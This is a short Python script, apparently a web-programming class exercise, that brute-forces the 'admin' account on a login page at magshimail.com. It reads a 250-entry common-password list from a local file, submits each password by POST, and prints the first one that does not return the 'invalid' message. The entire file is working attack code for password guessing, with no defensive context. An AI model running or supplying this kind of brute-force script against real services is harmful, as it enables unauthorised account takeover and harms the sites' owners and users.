import requests
import time
import requests


def main():
    URL = "http://magshimail.com/login/login.php"
    PATH = "C:\\Users\\magshimim\\PycharmProjects\\Web_Programming\\Class1\\top250.txt"
    WRONG = "Your Login Name or Password is invalid"
    password_list = red_passwords(PATH)
    for password in password_list:
        time.sleep(1)
        params = {'username': 'admin', 'password': password}
        response = requests.post(URL, params)
        print(password)
        if WRONG not in response.text:
            print("Username: admin\nPassword: ", password)
            break


def red_passwords(file_path):
    """
    The function reads the words into a list
    :param file_path: the path to the file with the passwords
    :type file_path: str`
    :return: the list with the passwords
    :rtype: list
    """
    with open(file_path, 'r') as file:
        password_list = file.read().split("|")
    return password_list


if __name__ == '__main__':
    main()